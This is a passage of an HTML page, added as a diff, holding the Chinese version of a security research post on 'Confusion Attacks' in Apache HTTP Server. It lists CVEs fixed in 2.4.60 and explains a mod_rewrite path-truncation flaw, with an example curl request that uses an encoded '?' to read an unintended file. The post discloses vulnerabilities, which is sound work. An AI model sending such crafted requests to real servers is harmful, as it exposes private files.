@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[ 繁體中文版本  |  English Version ]  嗨，這是我今年發表在 Black Hat USA 2024 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 HITCON 和 OrangeCon 上發表，有興趣搶先了解可點此取得投影片：  Confusion Attacks: Exploiting Hidden Semantic Ambiguity in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="(繁體中文) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!">
+<meta property="og:url" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="[ 繁體中文版本  |  English Version ]  嗨，這是我今年發表在 Black Hat USA 2024 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 HITCON 和 OrangeCon 上發表，有興趣搶先了解可點此取得投影片：  Confusion Attacks: Exploiting Hidden Semantic Ambiguity in">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/68a9e5dd90df580b-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/016234389a51f40b-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/cb68682cbd04105d-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/92f358a5ab548ae0-04.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/b891865923d68362-05.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/7ca2c0badb60f2df-06.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/59b47f0ae6d8d13b-07.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/9f927a5ccd4a2a69-08.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/0bc450787c481aef-09.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/dacded9bea644dff-10.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/c46787187d97fc85-11.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/444e2b7b11c6c80e-12.png">
+<meta property="article:published_time" content="2024-08-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:25:03.402Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2024-08-confusion-attacks-ch/68a9e5dd90df580b-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>(繁體中文) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | Orange Tsai</title><meta name="robots" content="noindex">
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        (繁體中文) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-08T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>[ <a href="https://blog.orange.tw/2024/08/confusion-attacks-ch.html">繁體中文版本</a>  |  <a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html">English Version</a> ]</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/68a9e5dd90df580b-01.png" alt="preview"></p>
+<p>嗨，這是我今年發表在 <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227">Black Hat USA 2024</a> 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 <a target="_blank" rel="noopener" href="https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/">HITCON</a> 和 <a target="_blank" rel="noopener" href="https://orangecon.nl/">OrangeCon</a> 上發表，有興趣搶先了解可點此取得投影片：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></p>
+</blockquote>
+<p>另外也謝謝來自 Akamai 的友善聯繫！ 此份研究發表後第一時間他們也發佈了緩解措施 (詳情可參考 <a target="_blank" rel="noopener" href="https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore">Akamai 的部落格</a>)。</p>
+<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>這篇文章探索了 Apache HTTP Server 中存在的架構問題，介紹了數個 Httpd 的架構債，<strong>包含 3 種不同的 Confusion Attacks、9 個新漏洞、20 種利用手法以及超過 30 種案例分析</strong>。 包括但不限於：</p>
+<ol>
+<li>怎麼使用一個 <code>?</code> 繞過 Httpd 內建的存取控制以及認證。</li>
+<li>不安全的 <code>RewriteRule</code> 怎麼跳脫 Web Root 並存取整個檔案系統。</li>
+<li>如何利用一段從 1996 遺留至今的程式碼把一個 XSS 轉化成 RCE。</li>
+</ol>
+<h1 id="大綱"><a href="#大綱" class="headerlink" title="大綱"></a>大綱</h1><ul>
+<li><a href="#%E5%9C%A8%E6%95%85%E4%BA%8B%E4%B9%8B%E5%89%8D">在故事之前</a></li>
+<li><a href="#%E6%95%85%E4%BA%8B%E6%98%AF%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%E7%9A%84%EF%BC%9F">故事是如何開始的？</a></li>
+<li><a href="#%E7%82%BA%E4%BB%80%E9%BA%BC-Apache-HTTP-Server-%E8%81%9E%E8%B5%B7%E4%BE%86%E8%87%AD%E8%87%AD%E7%9A%84%EF%BC%9F">為什麼 Apache HTTP Server 聞起來臭臭的？</a></li>
+<li><a href="#%E9%97%9C%E6%96%BC%E9%80%99%E6%AC%A1%E7%9A%84%E6%96%B0%E6%94%BB%E6%93%8A%E9%9D%A2%EF%BC%9A-Confusion-Attacks">關於這次的新攻擊面： Confusion Attacks</a><ul>
+<li><a href="#%F0%9F%94%A5-1-Filename-Confusion">1. Filename Confusion</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-1-1-Truncation">Primitive 1-1. Truncation</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation">1-1-1. Path Truncation</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-1-1-2-Mislead-RewriteFlag-Assignment">1-1-2. Mislead RewriteFlag Assignment</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass">Primitive 1-2. ACL Bypass</a></li>
+</ul>
+</li>
+<li><a href="#%F0%9F%94%A5-2-DocumentRoot-Confusion">2. DocumentRoot Confusion</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-1-Server-Side-Source-Code-Disclosure">Primitive 2-1. Server-Side Source Code Disclosure</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-1-1-Disclose-CGI-Source-Code">2-1-1. Disclose CGI Source Code</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-1-2-Disclose-PHP-Source-Code">2-1-2. Disclose PHP Source Code</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-2-Local-Gadgets-Manipulation">Primitive 2-2. Local Gadgets Manipulation!</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-1-Local-Gadget-to-Information-Disclosure">2-2-1. Local Gadget to Information Disclosure</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-2-Local-Gadget-to-XSS">2-2-2. Local Gadget to XSS</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI">2-2-3. Local Gadget to LFI</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-4-Local-Gadget-to-SSRF">2-2-4. Local Gadget to SSRF</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-2-5-Local-Gadget-to-RCE">2-2-5. Local Gadget to RCE</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-2-3-Jailbreak-from-Local-Gadgets">Primitive 2-3. Jailbreak from Local Gadgets</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-3-1-Jailbreak-from-Local-Gadgets">2-3-1. Jailbreak from Local Gadgets</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE">2-3-2. Jailbreak Local Gadgets to Redmine RCE</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%F0%9F%94%A5-3-Handler-Confusion">3. Handler Confusion</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-3-1-Overwrite-the-Handler">Primitive 3-1. Overwrite the Handler</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code">3-1-1. Overwrite Handler to Disclose PHP Source Code</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-1-2-Overwrite-Handler-to-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88">3-1-2. Overwrite Handler to ██████ ███████ ██████</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-Primitive-3-2-Invoke-Arbitrary-Handlers">Primitive 3-2. Invoke Arbitrary Handlers</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-1-Arbitrary-Handler-to-Information-Disclosure">3-2-1. Arbitrary Handler to Information Disclosure</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts">3-2-2. Arbitrary Handler to Misinterpret Scripts</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Full-SSRF">3-2-2. Arbitrary Handler to Full SSRF</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket">3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-3-2-4-Arbitrary-Handler-to-RCE">3-2-4. Arbitrary Handler to RCE</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%F0%9F%94%A5-4-%E5%85%B6%E5%AE%83%E6%BC%8F%E6%B4%9E">4. 其它漏洞</a><ul>
+<li><a href="#%E2%9A%94%EF%B8%8F-CVE-2024-38472---%E5%9F%BA%E6%96%BC-Windows-UNC-%E7%9A%84-SSRF">CVE-2024-38472 - 基於 Windows UNC 的 SSRF</a><ul>
+<li><a href="#%E2%9C%94%EF%B8%8F-%E9%80%8F%E9%81%8E-HTTP-%E8%AB%8B%E6%B1%82%E8%A7%A3%E6%9E%90%E5%99%A8%E8%A7%B8%E7%99%BC">透過 HTTP 請求解析器觸發</a></li>
+<li><a href="#%E2%9C%94%EF%B8%8F-%E9%80%8F%E9%81%8E-Type-Map-%E8%A7%B8%E7%99%BC">透過 Type-Map 觸發</a></li>
+</ul>
+</li>
+<li><a href="#%E2%9A%94%EF%B8%8F-CVE-2024-39573---%E5%9F%BA%E6%96%BC-RewriteRule-%E5%89%8D%E7%B6%B4%E5%8F%AF%E5%AE%8C%E5%85%A8%E6%8E%A7%E5%88%B6%E7%9A%84-SSRF">CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%9C%AA%E4%BE%86%E7%A0%94%E7%A9%B6%E6%96%B9%E5%90%91">未來研究方向</a></li>
+<li><a href="#%E7%B5%90%E8%AA%9E">結語</a></li>
+</ul>
+<h1 id="在故事之前"><a href="#在故事之前" class="headerlink" title="在故事之前"></a>在故事之前</h1><p>這裡純粹是一些個人的 Murmur，如果只對技術細節感興趣可以直接跳到 —— <a href="#%E6%95%85%E4%BA%8B%E6%98%AF%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%E7%9A%84%EF%BC%9F">故事是如何開始的？</a></p>
+<p>身為一名研究員、最大的快樂應該就是當自己的作品被同行關注並理解。所以當完成一個作品並擁有豐碩的成果後，理所當然會想要讓它被世界看到 —— 這也是為什麼我會多次在 Black Hat USA 以及 DEFCON 上分享的緣故。 在讀這篇文章的你也許知道，我從 2022 後就拿不到一個合法的簽證進入美國 (在<a target="_blank" rel="noopener" href="https://esta.cbp.dhs.gov/">免簽計畫</a>中的台灣，通常只需要線上申請，數分鐘到數小時內就能取得旅行授權)，導致錯過 <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199">Black Hat USA 2022</a> 的實體演講。甚至 2023 到秘魯還有復活節島獨旅也無法從美國轉機 :(</p>
+<p>為了解決這個情況，我從今年一月就開始準備 B1&#x2F;B2 簽證、撰寫各式文件、到大使館面試以及漫無止盡的等待，這不是一件好玩的事，但為了讓作品被看到，還是花了非常多的時間在為了簽證奔波，以及尋求各種可能，甚至到會議開始的前三個禮拜，還不清楚發表是否會被取消 (BH 一開始只接受現場演講，不過謝謝審稿委員對這份研究的認可最終還是能透過預錄的形式發表)，所以你所看到的所有內容包含投影片、錄影以及部落格文字都是在短短數十天內完成的。 😖</p>
+<p>我只是一個單純的研究員，自認問心無愧，對漏洞的態度也始終是 —— 漏洞就該讓它被廠商知道以及修復。 寫這些文字也不為了什麼，純粹紀錄下一些無奈的心情、今年所做過的努力，以及謝謝在這個過程中幫助過我的人，謝謝你們 :)</p>
+<h1 id="故事是如何開始的？"><a href="#故事是如何開始的？" class="headerlink" title="故事是如何開始的？"></a>故事是如何開始的？</h1><p>大概是在今年年初的時候，我開始思考下一個研究的目標，也許你知道我總是希望挑戰那些影響整個網際網路的大目標，所以開始尋找一些看似複雜的主題或有趣的開源專案，例如 Nginx、PHP、甚至開始看起 RFC 來強化自己對於協議實作細節的認知。</p>
+<p>雖然大部分的嘗試都以失敗告終 (不過有些也許會變成下一篇部落格主題 😉)，但在細細品嘗這些程式碼時，我回憶起了曾經在去年年中短暫看過 Apache HTTP Server 原始碼這件事！ 儘管最終由於工作的時程規畫並無深入的閱讀程式碼，但在那時就已經從它的編碼風格上「聞」到了一些不太好的味道。</p>
+<p>於是在今年決定繼續下去，把「為什麼聞起來怪怪的」這件事從原本只是一個說不出的「感覺」具象化，深入下去研究 Apache HTTP Server！</p>
+<h1 id="為什麼-Apache-HTTP-Server-聞起來臭臭的？"><a href="#為什麼-Apache-HTTP-Server-聞起來臭臭的？" class="headerlink" title="為什麼 Apache HTTP Server 聞起來臭臭的？"></a>為什麼 Apache HTTP Server 聞起來臭臭的？</h1><p>首先，Apache HTTP Server 是一個由「模組們」建構起來的世界，從它<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mpm.html">官方文件</a>中也看到其對於自身模組化 (MPMs - Multi-Processing Modules) 的自豪：</p>
+<blockquote>
+<p>Apache httpd has always accommodated a wide variety of environments through its modular design. […] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.</p>
+</blockquote>
+<p>整個 Httpd 的服務需要由數百個小模組齊心合力，共同合作才能完成客戶端的 HTTP 請求，<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/">官方所列出的 136 個模組</a><strong>其中約有快一半是預設啟用或經常被使用的模組</strong>！</p>
+<p>而更令人驚訝的是，這麼多模組在處理客戶端 HTTP 請求的時候，彼此之間還要共同維護著一份非常巨大的 <code>request_rec</code> 結構。 這個結構包括了在處理 HTTP 時會用到的一切元素，詳細的定義可以從 <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838">include&#x2F;httpd.h</a> 中找到。 所有模組都依賴這個巨大的結構去同步、溝通，甚至交換資料。 這個內部結構會像是拋接球般在所有模組間傳遞來傳遞去，每個模組都可以根據自己的喜好去隨意修改這個結構上的任意值！</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/016234389a51f40b-02.png"></p>
+<p>這樣子的合作方式從軟體工程的角度來說其實不是什麼新鮮事，個體只需專心把份內事完成，只要所有人都乖乖完成自己的工作，那客戶就可以正常享受 Httpd 所提供的服務。 這樣子的分工在數個模組內可能還沒什麼問題，<strong>但如果今天把規模放大到數百個模組間的協同合作 —— 它們真的有辦法好好合作嗎？</strong> 🤔</p>
+<p>所以我們的出發點很簡單 —— <strong>模組間其實並不完全了解彼此的實作細節，但卻又被要求要一起合作</strong>。 每個模組可能由不同的開發者實作，程式碼歷經多年的疊代、重整以及修改，它們真的還清楚自己在做什麼嗎？ 就算對自己瞭若指掌，那對其它模組呢？ 在缺乏一個好的開發標準或使用準則下，這中間必然會存在很多小縫隙是我們可以利用的！</p>
+<h1 id="關於這次的新攻擊面：-Confusion-Attacks"><a href="#關於這次的新攻擊面：-Confusion-Attacks" class="headerlink" title="關於這次的新攻擊面： Confusion Attacks"></a>關於這次的新攻擊面： Confusion Attacks</h1><p>基於前面的思考，我們開始專注在<strong>研究這些模組間的「關係」以及「交互作用」</strong>。 如果有一個模組不小心修改到了它覺得不重要但對另一個模組至關重要的結構欄位，那可能就會影響該模組的判斷。 甚至更進一步，如果 Apache HTTP Server 對這些結構的定義不夠精確，導致不同模組對同一個欄位在理解上有著根本的不一致，這都可能產生安全上的風險！</p>
+<p>從這個出發點我們發展出了三種不同的攻擊，由於這些攻擊或多或少都模組對於結構欄位的誤用有關，因此把這個攻擊面命名為「Confusion Attack」，而以下是我們所發展出的攻擊：</p>
+<ol>
+<li><strong>Filename Confusion</strong></li>
+<li><strong>DocumentRoot Confusion</strong></li>
+<li><strong>Handler Confusion</strong></li>
+</ol>
+<p>從這些攻擊出發我們找到了 9 個不同的漏洞：</p>
+<ol>
+<li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li>
+<li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li>
+<li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li>
+<li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable&#x2F;malicious backend application output to run local handlers via internal redirect</li>
+<li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li>
+<li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li>
+<li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li>
+<li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li>
+<li><strong>CVE-2024-??????</strong> - [redacted]</li>
+</ol>
+<p>這些漏洞都透過官方的安全信箱回報，並由 Apache HTTP Server 團隊在 2024-07-01 發佈安全性通報以及 2.4.60 更新 (詳細可參考<a target="_blank" rel="noopener" href="https://httpd.apache.org/security/vulnerabilities_24.html">官方公告</a>)。</p>
+<p>由於這是一個針對 Httpd 架構以及其內部機制所帶來的新攻擊面，<del>理所當然第一個參與的人可以找到最多漏洞，因此我也是目前擁有最多 Apache HTTP Server CVE 的人 😉</del>，導致很多更新修復由於其歷史架構無法向下兼容。 所以對於很多運行許久的正式伺服器來說修復並不是一件容易的事，若網站管理員不經思考就直接更新反而會打破許多舊有的設定造成服務中斷。 😨</p>
+<p>接下來就開始介紹這次發展出來的攻擊們吧！</p>
+<h2 id="🔥-1-Filename-Confusion"><a href="#🔥-1-Filename-Confusion" class="headerlink" title="🔥 1. Filename Confusion"></a>🔥 1. Filename Confusion</h2><p>首先，第一個是基於 Filename 欄位上的 Confusion，從字面上來看 <code>r-&gt;filename</code> 應該是一個檔案系統路徑，然而在 Httpd 中，有些模組會把它當成網址來處理。 如果在 HTTP 請求的上下文中，有些模組把 <code>r-&gt;filename</code> 當成檔案路徑，而其他模組將它當成網址，這其中的不一致就會造成安全上的問題！</p>
+<h3 id="⚔️-Primitive-1-1-Truncation"><a href="#⚔️-Primitive-1-1-Truncation" class="headerlink" title="⚔️ Primitive 1-1. Truncation"></a>⚔️ Primitive 1-1. Truncation</h3><p>所以哪些模組會把 <code>r-&gt;filename</code> 當成網址呢？ 首先是 <code>mod_rewrite</code> 允許網站管理員透過 <code>RewriteRule</code> 語法輕鬆的將路徑透過指定的規則改寫：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span> Pattern Substitution<span class="meta"> [flags]</span></span><br></pre></td></tr></table></figure>
+<p>其中目標可以是一個檔案系統路徑或是一個網址，我想這應該是一個為了使用者體驗所做出的方便，但同時這個「方便」也帶出了一些風險，例如<strong>在改寫路徑時，<code>mod_rewrite</code> 會強制把結果視為網址處理 (<code>splitout_queryargs()</code>)</strong>，這導致了在 HTTP 請求中可以透過一個問號 <code>%3F</code> 去截斷 <code>RewriteRule</code> 後面的路徑或網址，並引出以下兩種攻擊手法。</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141">modules&#x2F;mappers&#x2F;mod_rewrite.c#L4141</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Apply a single RewriteRule</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">apply_rewrite_rule</span><span class="params">(rewriterule_entry *p, rewrite_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ap_regmatch_t</span> regmatch[AP_MAX_REG_MATCH];</span><br><span class="line">    <span class="type">apr_array_header_t</span> *rewriteconds;</span><br><span class="line">    rewritecond_entry *conds;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rewriteconds-&gt;nelts; ++i) &#123;</span><br><span class="line">        rewritecond_entry *c = &amp;conds[i];</span><br><span class="line">        rc = apply_rewrite_cond(c, ctx);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [...] do the remaining stuff</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Now adjust API&#x27;s knowledge about r-&gt;filename and r-&gt;args */</span></span><br><span class="line">    r-&gt;filename = newuri;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;perdir &amp;&amp; (p-&gt;flags &amp; RULEFLAG_DISCARDPATHINFO)) &#123;</span><br><span class="line">        r-&gt;path_info = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    splitout_queryargs(r, p-&gt;flags);         <span class="comment">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="✔️-1-1-1-Path-Truncation"><a href="#✔️-1-1-1-Path-Truncation" class="headerlink" title="✔️ 1-1-1. Path Truncation"></a>✔️ 1-1-1. Path Truncation</h4><p>首先，第一個攻擊手法是檔案系統路徑上的截斷，想像下面這個 <code>RewriteRule</code>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> <span class="string">&quot;^/user/(.+)$&quot;</span> <span class="string">&quot;/var/user/$1/profile.yml&quot;</span></span><br></pre></td></tr></table></figure>
+<p>伺服器會根據網址路徑 <code>/user/</code> 後的使用者名稱開啟相對應的個人設定檔案，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/user/orange</span><br><span class="line"> <span class="comment"># the output of file `/var/user/orange/profile.yml`</span></span><br></pre></td></tr></table></figure>
+<p>由於 <code>mod_rewrite</code> 會強制將重寫後的結果當成一個網址處理，因此雖然目標是一個檔案系統路徑，但卻可以透過一個問號去截斷後方的 <code>/profile.yml</code> 例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/user/orange%2Fsecret.yml%3F</span><br><span class="line"> <span class="comment"># the output of file `/var/user/orange/secret.yml`</span></span><br></pre></td></tr></table></figure>
+<p>這是我們的第一個攻擊手法 —— 路徑截斷。 對於這個攻擊手法的探索先稍稍停留在這邊，雖然目前看起來還只是一個小瑕疵，但請先記好它，因為這會在之後的攻擊中一再的出現，慢慢把這個看似無用的小破口撕裂開來！ 😜</p>
+<h4 id="✔️-1-1-2-Mislead-RewriteFlag-Assignment"><a href="#✔️-1-1-2-Mislead-RewriteFlag-Assignment" class="headerlink" title="✔️ 1-1-2. Mislead RewriteFlag Assignment"></a>✔️ 1-1-2. Mislead RewriteFlag Assignment</h4><p>截斷手法的第二個利用是誤導 <code>RewriteFlag</code> 的設置，想像網站管理員透過下列的 <code>RewriteRule</code> 去管理網站中路徑以及相對應模組：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span>  ^(.+\.php)$  $<span class="number">1</span> <span class="meta"> [H=application/x-httpd-php]</span></span><br></pre></td></tr></table></figure>
